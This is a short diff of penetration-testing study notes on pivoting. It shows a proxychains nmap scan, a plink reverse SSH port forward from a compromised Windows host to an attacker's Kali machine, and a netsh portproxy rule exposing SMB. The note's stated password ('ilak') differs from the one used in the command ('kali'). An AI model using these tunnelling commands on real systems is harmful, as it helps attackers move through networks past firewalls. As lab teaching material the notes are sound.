@@ -132,7 +132,7 @@ kali@ttnho:~$ sudo proxychains nmap --top-port=20 -sT -Pn 192.168.1.10
 > Assume: we have gained access to a Windows 10 machine during our assessment through a vulnerability. We would like to scan this database or interact with the service. However, because of the firewall, we cannot directly interact with this service from our Kali machine.
 > =>use plink.exe to connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali user (-l kali) with a password of "ilak" (-pw ilak) to create a remote port forward (-R) of port 1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306)
 
-```powershell
+```shell
 c:\nho> plink.exe
 c:\nho> plink.exe -ssh -l kali -pw kali -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
 
@@ -155,7 +155,7 @@ Example: we will use the netsh (interface) context to add an IPv4-to-IPv4 (v4tov
 
 Note: payload on the compromised machine
 
-```powershell
+```shell
 c:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
 
 #Check port 4455 is listening on the compromised windows host
